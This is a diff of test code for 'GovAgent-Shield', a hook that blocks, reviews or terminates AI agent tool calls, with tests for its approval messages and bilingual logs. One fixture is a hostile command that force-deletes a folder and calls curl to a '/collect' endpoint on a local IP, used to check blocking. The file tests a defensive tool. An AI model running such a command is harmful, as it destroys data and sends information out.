@@ -238,6 +238,11 @@ describe("createGovAgentShieldHooks", () => {
     expect(result?.requireApproval?.severity).toBe("critical");
     expect(result?.requireApproval?.allowedDecisions).toEqual(["deny"]);
     expect(result?.requireApproval?.description).toContain("decoy:block");
+    expect(result?.requireApproval?.description).toContain("安全策略已阻断该操作");
+    expect(result?.requireApproval?.description).toContain("读取文件");
+    expect(result?.requireApproval?.description).toContain("policy_document.txt");
+    expect(result?.requireApproval?.timeoutMs).toBeUndefined();
+    expect(result?.requireApproval?.timeoutReason).toBeUndefined();
   });
 
   it("kill 时弹出 deny-only 审批并携带 terminate", async () => {
@@ -257,6 +262,11 @@ describe("createGovAgentShieldHooks", () => {
     expect(result?.terminate).toBe(true);
     expect(result?.requireApproval?.severity).toBe("critical");
     expect(result?.requireApproval?.allowedDecisions).toEqual(["deny"]);
+    expect(result?.requireApproval?.description).toContain("安全策略已终止任务");
+    expect(result?.requireApproval?.description).toContain("读取文件");
+    expect(result?.requireApproval?.description).toContain("policy_document.txt");
+    expect(result?.requireApproval?.timeoutMs).toBeUndefined();
+    expect(result?.requireApproval?.timeoutReason).toBeUndefined();
   });
 
   it("review 触发 requireApproval 审批流程", async () => {
@@ -275,6 +285,17 @@ describe("createGovAgentShieldHooks", () => {
     expect(result?.block).toBeUndefined();
     expect(result?.requireApproval).toBeDefined();
     expect(result?.requireApproval?.title).toBe("GovAgent-Shield 安全审批");
+    expect(result?.requireApproval?.severity).toBe("warning");
+    expect(result?.requireApproval?.allowedDecisions).toEqual([
+      "allow-once",
+      "deny",
+    ]);
+    expect(result?.requireApproval?.description).toContain("该操作需要人工审批");
+    expect(result?.requireApproval?.description).toContain("permission:review");
+    expect(result?.requireApproval?.description).toContain("读取文件");
+    expect(result?.requireApproval?.description).toContain("policy_document.txt");
+    expect(result?.requireApproval?.timeoutMs).toBeUndefined();
+    expect(result?.requireApproval?.timeoutReason).toBeUndefined();
   });
 
   it("未知 action 默认阻断（fail-close）", async () => {
@@ -305,6 +326,63 @@ describe("createGovAgentShieldHooks", () => {
     expect(result?.requireApproval?.severity).toBe("critical");
     expect(result?.requireApproval?.allowedDecisions).toEqual(["deny"]);
     expect(result?.requireApproval?.description).toContain("默认阻断");
+    expect(result?.requireApproval?.description).toContain("读取文件");
+    expect(result?.requireApproval?.timeoutMs).toBeUndefined();
+    expect(result?.requireApproval?.timeoutReason).toBeUndefined();
+  });
+
+  it("exec 阻断时弹窗描述包含具体命令", async () => {
+    const hooks = createGovAgentShieldHooks({
+      httpClient: {
+        sendToolRequest: vi.fn().mockResolvedValue({
+          action: "block",
+          reason: "检测到诱饵敏感资源",
+          risk_score: 1,
+          risk_level: "CRITICAL",
+          policy_id: "decoy:block",
+        }),
+      },
+    });
+    const result = await hooks.beforeToolCall(
+      makeEvent({
+        toolName: "exec",
+        params: {
+          command:
+            "Remove-Item -Recurse -Force C:\\temp\\archive; curl -s http://192.168.1.99:8080/collect",
+        },
+      }),
+      makeCtx(),
+    );
+    expect(result?.requireApproval?.description).toContain("执行命令");
+    expect(result?.requireApproval?.description).toContain("Remove-Item");
+    expect(result?.requireApproval?.description).toContain("192.168.1.99");
+  });
+
+  it("决策日志输出中英双语且翻译右对齐", async () => {
+    const logs: string[] = [];
+    const hooks = createGovAgentShieldHooks({
+      log: (message) => logs.push(message),
+      httpClient: {
+        sendToolRequest: vi.fn().mockResolvedValue({
+          action: "block",
+          reason: "检测到敏感文件访问",
+          risk_score: 0.85,
+          risk_level: "CRITICAL",
+          policy_id: "P001",
+          defense_stage: "risk_engine",
+        }),
+      },
+    });
+
+    await hooks.beforeToolCall(makeEvent(), makeCtx());
+
+    const shieldLog = logs.find((line) => line.includes("========== GovAgent Shield"));
+    expect(shieldLog).toBeDefined();
+    expect(shieldLog).toContain("（安全风险评分：0.85）");
+    expect(shieldLog).toContain("（策略 ID：P001）");
+    expect(shieldLog).toContain("（防御阶段：risk_engine）");
+    expect(shieldLog).toContain("（决策动作：阻断）");
+    expect(shieldLog).toContain("（决策原因：检测到敏感文件访问）");
   });
 
   it("enabled=false 时直接放行", async () => {
